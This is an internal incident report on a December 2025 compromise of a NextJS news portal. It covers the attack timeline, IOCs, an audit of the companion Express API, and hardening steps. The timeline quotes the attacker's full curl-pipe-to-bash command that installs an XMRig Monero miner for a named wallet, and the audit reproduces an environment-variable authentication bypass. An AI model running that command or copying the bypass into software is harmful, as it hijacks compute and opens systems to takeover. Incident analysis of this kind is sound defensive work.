# Security Incident Report - December 8, 2025

## Executive Summary

On December 8, 2025, at approximately 08:31 UTC, the NewsNexus10Portal application running on the nn10prod server was compromised by threat actors who successfully executed a cryptocurrency mining malware installation attack. The attackers exploited a vulnerability in the NextJS application to gain remote code execution (RCE) capabilities, performed extensive filesystem reconnaissance, and attempted to install XMRig cryptocurrency mining software configured to mine Monero for the attacker's wallet.

**Severity: CRITICAL**

**Impact:** Remote Code Execution, Unauthorized Cryptocurrency Mining, Data Exposure Risk

**Status:** Investigation Complete - Remediation Recommendations Provided

---

## Timeline of Attack

### 08:31 UTC - Initial Exploitation and Reconnaissance

The attack began with the exploitation of a vulnerability in the NewsNexus10Portal NextJS application. The logs show evidence of extensive filesystem scanning, indicating the attacker gained code execution privileges:

- **Lines 1-40 of breach log:** Systematic directory enumeration across critical system paths including:
  - `/run/systemd/` - System service directories
  - `/sys/` - Kernel and hardware interfaces
  - `/tmp/` - Temporary files and service-specific directories
  - `/var/lib/` - System state and package data
  - `/var/log/` - System logs
  - `/var/spool/` - Scheduled tasks (cron)

This reconnaissance pattern indicates the attacker was:
1. Mapping the system architecture
2. Identifying running services
3. Searching for sensitive configuration files
4. Looking for persistence mechanisms (cron jobs)
5. Attempting privilege escalation vectors

### 08:31 UTC - Header Manipulation Errors

**Lines 41-52:** Evidence of attack vector exploitation through HTTP header manipulation:

```
TypeError: Invalid character in header content ["x-action-redirect"]
    at i.setHeader (.next/server/chunks/586.js:22:6902)
    at async m (.next/server/app/page.js:1:7354)
    at async p (.next/server/app/page.js:2:1860)
```

**Analysis:** The `x-action-redirect` header error suggests the attacker injected malicious characters or code through NextJS Server Actions or custom headers. This is consistent with:
- NextJS Server Action injection vulnerabilities
- HTTP Response Splitting attacks
- Header injection leading to code execution

### 08:49 UTC - Malware Deployment Phase

**Lines 53-188:** Attempted installation of XMRig cryptocurrency mining malware:

The attacker executed a sophisticated command injection payload disguised within a ping command. The decoded malicious command was:

```bash
curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | \
LC_ALL=en_US.UTF-8 bash -s \
85RhdwGyMRYiZ2f1v96c4USHSBkTDyG6NcdeE9mSbErnbtgctEUew3eKaYzzjEtzVB5WGuvPHWyVPSBCmyeXfLcWEHRwbXn
```

**Malware Details:**
- **Type:** XMRig Monero (XMR) cryptocurrency miner
- **Source:** c3pool.org mining pool installation script
- **Wallet:** `85RhdwGyMRYiZ2f1v96c4USHSBkTDyG6NcdeE9mSbErnbtgctEUew3eKaYzzjEtzVB5WGuvPHWyVPSBCmyeXfLcWEHRwbXn`
- **Impact:** CPU resource theft, increased operational costs, system degradation

The attack attempted but failed with exit code 2, suggesting:
- Insufficient permissions
- Security controls blocked the execution
- Network restrictions prevented the download
- Missing dependencies

---

## Attack Vector Analysis

### Primary Vulnerability: NextJS Application (NewsNexus10Portal)

The attack originated through the NewsNexus10Portal NextJS application. Based on the error logs and attack patterns, the most likely attack vectors are:

#### 1. NextJS Server Actions Injection
The `x-action-redirect` header manipulation errors point to exploitation of NextJS Server Actions. Vulnerable code patterns include:
- Unsanitized user input passed to redirect() or headers()
- Improper validation of action parameters
- Missing input sanitization in server-side form handlers

#### 2. Command Injection via User Input
The attacker gained the ability to execute arbitrary shell commands, evidenced by:
- Execution of directory scanning operations
- Attempted curl/bash command execution
- Base64-encoded payload delivery

#### 3. Possible Entry Points
- Unprotected API routes in the NextJS application
- Server-side form processing without input validation
- File upload functionality with insufficient filtering
- Webhook or callback endpoints without authentication

---

## Infrastructure Analysis

### Architecture Overview at Time of Breach

```
[Internet]
    ↓
[Maestro03 - Ubuntu 20.04 LTS]
    ↓ (nginx reverse proxy)
    ├── news-nexus.kineticmetrics.com → nn10prod:3001 (NewsNexus10Portal - NextJS)
    └── api.news-nexus.kineticmetrics.com → nn10prod:8001 (NewsNexus10API - Express)
```

### Infrastructure Vulnerabilities Identified

1. **Reverse Proxy (Maestro03)**
   - Ubuntu 20.04 LTS (verify if fully patched)
   - nginx configuration security unknown
   - No evidence of WAF (Web Application Firewall)
   - No evidence of rate limiting
   - No evidence of IDS/IPS

2. **Application Server (nn10prod)**
   - Multiple Node.js services running
   - Python services also present
   - Unclear privilege separation
   - No evidence of containerization/isolation

---

## API Security Assessment (NewsNexus10API)

While the attack targeted the NextJS Portal, analysis of the NewsNexus10API reveals critical security vulnerabilities that compound the overall risk:

### Critical Findings

#### 1. Exposed Secrets (CRITICAL)
**File:** `.env` in repository

The following credentials were found exposed:

```
JWT_SECRET=SECRET
KEY_OPEN_AI=SECRET
ADMIN_NODEMAILER_EMAIL_PASSWORD="SECRET"
```

**Impact:**
- JWT_SECRET exposure allows attackers to forge authentication tokens for any user
- OpenAI API key can be used to make unauthorized API calls, incurring costs
- Email credentials enable unauthorized email sending and potential account takeover

**Risk:** If these are production credentials, immediate rotation is required.

#### 2. Authentication Bypass Backdoor (HIGH)
**File:** `src/modules/userAuthentication.js:5-11`

```javascript
async function authenticateToken(req, res, next) {
  if (process.env.AUTHENTIFICATION_TURNED_OFF === "true") {
    const user = await User.findOne({
      where: { email: "nickrodriguez@kineticmetrics.com" },
    });
    req.user = user;
    return next();
  }
  // ... normal authentication
}
```

**Impact:**
- Single environment variable completely bypasses all authentication
- Automatically authenticates as admin user
- No audit logging of this bypass
- Could be exploited if environment variables are compromised

#### 3. CORS Misconfiguration (MEDIUM)
**File:** `src/app.js:32-37`

```javascript
app.use(
  cors({
    credentials: true,
    exposedHeaders: ["Content-Disposition"],
  })
);
```

**Issues:**
- No origin validation specified (allows all origins)
- Credentials enabled with wildcard origins is a security anti-pattern
- Enables CSRF attacks from any domain

#### 4. Large Request Body Limits (MEDIUM)
**File:** `src/app.js:42-43`

```javascript
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));
```

**Impact:**
- 10MB limits enable large payload attacks
- Potential for DoS through memory exhaustion
- Facilitates injection of large malicious payloads

#### 5. Server Binding to All Interfaces (LOW)
**File:** `src/server.js:38`

```javascript
app.listen(PORT, "0.0.0.0", () => {
```

**Impact:**
- Binds to all network interfaces instead of localhost
- Should rely on reverse proxy for external access
- Increases attack surface if firewall rules are misconfigured

#### 6. Error Handling Exposes Stack Traces (LOW)
**File:** `src/server.js:20-34`

The global error handlers log full stack traces, which could be exposed to users if error responses are not properly filtered.

---

## Security Recommendations

### Immediate Actions (Critical Priority)

#### 1. Incident Response
- [ ] **Isolate affected systems** - Take nn10prod offline immediately
- [ ] **Preserve forensic evidence** - Create complete system snapshots
- [ ] **Check for persistence mechanisms:**
  - Search cron jobs: `crontab -l` and `/etc/cron.d/`
  - Check systemd services: `systemctl list-units --type=service`
  - Examine startup scripts: `/etc/rc.local`, `.bashrc`, `.bash_profile`
  - Review user accounts: `/etc/passwd` for unauthorized additions
  - Check for hidden processes: `ps auxf`, `lsof`, `netstat -tulpn`
- [ ] **Scan for cryptocurrency miners:**
  ```bash
  ps aux | grep -i xmrig
  find / -name "*xmrig*" 2>/dev/null
  netstat -tulpn | grep -E ":(3333|5555|7777|14444)"
  ```
- [ ] **Review nginx access logs** on Maestro03 for attack patterns
- [ ] **Check for data exfiltration** - Review outbound network connections

#### 2. Credential Rotation (Immediate)
- [ ] **Rotate ALL exposed credentials:**
  - JWT_SECRET
  - OpenAI API key
  - Email password (ADMIN_NODEMAILER_EMAIL_PASSWORD)
  - Database credentials
  - SSH keys
  - Any other API keys or secrets
- [ ] **Revoke all existing JWT tokens** (requires users to re-authenticate)
- [ ] **Review OpenAI API usage** for unauthorized charges
- [ ] **Check email account** for unauthorized access or sent messages

#### 3. NextJS Application Audit
- [ ] **Identify vulnerable code paths** in NewsNexus10Portal
- [ ] **Review all Server Actions** for input validation
- [ ] **Audit all API routes** for authentication and authorization
- [ ] **Review file upload handlers** for proper validation
- [ ] **Implement input sanitization** for all user-controlled data

### Short-term Remediation (High Priority)

#### NextJS Front-End Security

1. **Server Actions Hardening**
   ```typescript
   // Implement strict input validation
   import { z } from 'zod';

   const schema = z.object({
     field: z.string().max(100).regex(/^[a-zA-Z0-9\s]+$/),
   });

   export async function serverAction(formData: FormData) {
     const validated = schema.parse({
       field: formData.get('field'),
     });
     // Process validated input
   }
   ```

2. **Header Security**
   - Implement Content Security Policy (CSP)
   - Add security headers via middleware:
   ```typescript
   // middleware.ts
   export function middleware(request: NextRequest) {
     const headers = new Headers(request.headers);
     headers.set('X-Content-Type-Options', 'nosniff');
     headers.set('X-Frame-Options', 'DENY');
     headers.set('X-XSS-Protection', '1; mode=block');
     headers.set('Strict-Transport-Security', 'max-age=31536000');
     return NextResponse.next({ headers });
   }
   ```

3. **Rate Limiting**
   ```typescript
   import { Ratelimit } from '@upstash/ratelimit';

   const ratelimit = new Ratelimit({
     redis: redis,
     limiter: Ratelimit.slidingWindow(10, '10 s'),
   });
   ```

4. **Authentication on All Routes**
   - Implement middleware to verify authentication on all protected routes
   - Use NextAuth.js or similar for robust session management
   - Never trust client-side authentication state

5. **Dependency Updates**
   ```bash
   npm audit fix
   npm update
   ```
   - Review and update all dependencies, especially Next.js to latest stable version
   - Subscribe to security advisories

#### API Security Improvements

1. **Secrets Management**
   ```javascript
   // Remove .env from repository
   // Add to .gitignore:
   .env
   .env.local
   .env.production

   // Use external secrets manager:
   // - AWS Secrets Manager
   // - HashiCorp Vault
   // - Azure Key Vault
   ```

2. **Remove Authentication Bypass**
   ```javascript
   // src/modules/userAuthentication.js
   // DELETE lines 5-11 entirely
   // Authentication should NEVER be bypassable via environment variable
   ```

3. **Implement Proper CORS**
   ```javascript
   const allowedOrigins = [
     'https://news-nexus.kineticmetrics.com',
     process.env.NODE_ENV === 'development' ? 'http://localhost:3001' : null,
   ].filter(Boolean);

   app.use(
     cors({
       origin: function(origin, callback) {
         if (!origin || allowedOrigins.indexOf(origin) !== -1) {
           callback(null, true);
         } else {
           callback(new Error('Not allowed by CORS'));
         }
       },
       credentials: true,
       exposedHeaders: ['Content-Disposition'],
     })
   );
   ```

4. **Reduce Body Size Limits**
   ```javascript
   // Adjust based on actual needs
   app.use(express.json({ limit: '1mb' }));
   app.use(express.urlencoded({ extended: true, limit: '1mb' }));
   ```

5. **Input Validation Middleware**
   ```javascript
   const { body, validationResult } = require('express-validator');

   router.post('/endpoint',
     [
       body('field').trim().isLength({ min: 1, max: 100 })
         .escape().matches(/^[a-zA-Z0-9\s]+$/),
     ],
     (req, res) => {
       const errors = validationResult(req);
       if (!errors.isEmpty()) {
         return res.status(400).json({ errors: errors.array() });
       }
       // Process validated input
     }
   );
   ```

6. **Implement Rate Limiting**
   ```javascript
   const rateLimit = require('express-rate-limit');

   const limiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
     max: 100, // limit each IP to 100 requests per windowMs
     message: 'Too many requests from this IP',
   });

   app.use('/api/', limiter);
   ```

7. **Security Headers**
   ```javascript
   const helmet = require('helmet');
   app.use(helmet());
   ```

8. **Error Response Sanitization**
   ```javascript
   // Never expose stack traces to clients in production
   app.use((err, req, res, next) => {
     console.error(err.stack); // Log for debugging
     res.status(500).json({
       message: process.env.NODE_ENV === 'production'
         ? 'Internal server error'
         : err.message
     });
   });
   ```

#### Infrastructure Security

1. **Maestro03 Reverse Proxy Hardening**

   Update nginx configuration (`/etc/nginx/sites-available/`):

   ```nginx
   # Rate limiting
   limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
   limit_req_zone $binary_remote_addr zone=web_limit:10m rate=30r/s;

   server {
       listen 443 ssl http2;
       server_name api.news-nexus.kineticmetrics.com;

       # Security headers
       add_header X-Frame-Options "DENY" always;
       add_header X-Content-Type-Options "nosniff" always;
       add_header X-XSS-Protection "1; mode=block" always;
       add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

       # Rate limiting
       limit_req zone=api_limit burst=20 nodelay;

       # Hide nginx version
       server_tokens off;

       # Request size limits
       client_max_body_size 2m;
       client_body_buffer_size 128k;

       # Timeouts
       client_body_timeout 10s;
       client_header_timeout 10s;

       # Block common attack patterns
       if ($request_uri ~* "(\.\./)|(\.\.\\)") {
           return 403;
       }

       if ($query_string ~* "(base64|encode|script|eval)") {
           return 403;
       }

       location / {
           proxy_pass http://localhost:8001;
           proxy_http_version 1.1;
           proxy_set_header Upgrade $http_upgrade;
           proxy_set_header Connection 'upgrade';
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
           proxy_cache_bypass $http_upgrade;

           # Timeout settings
           proxy_connect_timeout 60s;
           proxy_send_timeout 60s;
           proxy_read_timeout 60s;
       }
   }
   ```

2. **Firewall Configuration**
   ```bash
   # Configure UFW (Ubuntu Firewall)
   sudo ufw default deny incoming
   sudo ufw default allow outgoing
   sudo ufw allow ssh
   sudo ufw allow 80/tcp
   sudo ufw allow 443/tcp
   sudo ufw enable

   # On nn10prod, ensure only Maestro03 can access application ports
   sudo ufw allow from <maestro03_ip> to any port 3001
   sudo ufw allow from <maestro03_ip> to any port 8001
   ```

3. **System Hardening**
   ```bash
   # Keep systems updated
   sudo apt update && sudo apt upgrade -y
   sudo apt autoremove -y

   # Install fail2ban for intrusion prevention
   sudo apt install fail2ban -y
   sudo systemctl enable fail2ban
   sudo systemctl start fail2ban

   # Configure fail2ban for nginx
   # /etc/fail2ban/jail.local
   [nginx-limit-req]
   enabled = true
   filter = nginx-limit-req
   logpath = /var/log/nginx/error.log
   ```

4. **Process Isolation**
   - Run each Node.js service as separate non-privileged user
   - Implement systemd service isolation:
   ```ini
   [Service]
   User=nexus-api
   Group=nexus-api
   NoNewPrivileges=true
   PrivateTmp=true
   ProtectSystem=strict
   ProtectHome=true
   ReadWritePaths=/var/lib/nexus
   ```

### Long-term Improvements (Medium Priority)

1. **Web Application Firewall (WAF)**
   - Deploy ModSecurity with OWASP Core Rule Set
   - Or use cloud-based WAF (Cloudflare, AWS WAF)

2. **Intrusion Detection**
   - Install OSSEC or Wazuh for host-based IDS
   - Implement centralized logging (ELK stack, Splunk)
   - Set up alerts for suspicious activities

3. **Containerization**
   - Migrate services to Docker containers
   - Implement proper container security (read-only filesystems, resource limits)
   - Use Docker secrets for credential management

4. **Network Segmentation**
   - Separate application tier from data tier
   - Use VLANs or VPCs to isolate environments
   - Implement zero-trust network access

5. **Security Monitoring**
   - Implement SIEM (Security Information and Event Management)
   - Set up automated alerting for:
     - Failed authentication attempts
     - Unusual outbound connections
     - File integrity changes
     - Suspicious command executions
     - Resource usage spikes

6. **Automated Security Testing**
   - Integrate SAST (Static Application Security Testing) in CI/CD
   - Run regular DAST (Dynamic Application Security Testing)
   - Implement dependency vulnerability scanning
   - Schedule regular penetration testing

7. **Backup and Disaster Recovery**
   - Implement automated, encrypted backups
   - Store backups in separate, isolated location
   - Test restore procedures regularly
   - Document incident response procedures

8. **Security Training**
   - Developer security training on OWASP Top 10
   - Secure coding practices
   - Incident response drills

---

## Indicators of Compromise (IOCs)

### Network IOCs
- **Malicious Domain:** `download.c3pool.org`
- **Malicious Domain:** `requestrepo.com` (specifically: `0ql6uqw4.requestrepo.com`)
- **Mining Pool Connections:** Outbound connections to ports 3333, 5555, 7777, 14444

### File IOCs
- **Process Name:** `xmrig`, `xmr`, variations
- **File Paths:** Look for cryptocurrency miner binaries
- **Scripts:** `setup_c3pool_miner.sh`

### Behavioral IOCs
- Sustained high CPU usage from unknown processes
- Unexpected outbound HTTPS connections
- Filesystem enumeration activities
- Commands containing base64 encoding/decoding
- Curl/wget downloads from suspicious domains

### Monero Wallet
- `85RhdwGyMRYiZ2f1v96c4USHSBkTDyG6NcdeE9mSbErnbtgctEUew3eKaYzzjEtzVB5WGuvPHWyVPSBCmyeXfLcWEHRwbXn`

---

## Lessons Learned

### What Went Wrong

1. **Insufficient Input Validation:** The NextJS application did not properly sanitize user inputs, allowing command injection
2. **Lack of Security Monitoring:** The attack was not detected in real-time
3. **No WAF Protection:** A WAF could have blocked the malicious requests
4. **Exposed Secrets:** Critical credentials stored in version control
5. **Missing Security Headers:** No CSP or other protective headers
6. **No Rate Limiting:** Attackers could probe the application without restriction

### What Went Right

1. **Command Execution Failed:** The malware installation did not succeed
2. **Logs Were Preserved:** We have detailed evidence of the attack
3. **Timely Detection:** The breach was identified relatively quickly

---

## Conclusion

This incident represents a serious security breach that could have resulted in:
- Sustained cryptocurrency mining (theft of compute resources)
- Data exfiltration from the database
- Lateral movement to other systems
- Installation of persistent backdoors

The attack succeeded due to a combination of:
1. Application-level vulnerability (NextJS RCE)
2. Insufficient security controls at the infrastructure level
3. Lack of defense-in-depth architecture

Immediate action is required to:
1. Remediate the vulnerable NextJS application
2. Rotate all compromised credentials
3. Implement recommended security controls
4. Establish ongoing security monitoring

The recommendations in this report, if implemented, will significantly improve the security posture of the NewsNexus infrastructure and reduce the likelihood of similar attacks in the future.

---

## Appendix A: References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)

## Appendix B: Contact Information

For questions regarding this incident report, please contact:
- Security Team: [security contact]
- Infrastructure Team: [infrastructure contact]
- Development Team: [development contact]

---

**Report Generated:** December 13, 2025
**Report Author:** Security Analysis Team
**Classification:** Internal Use Only
**Next Review Date:** 30 days post-remediation
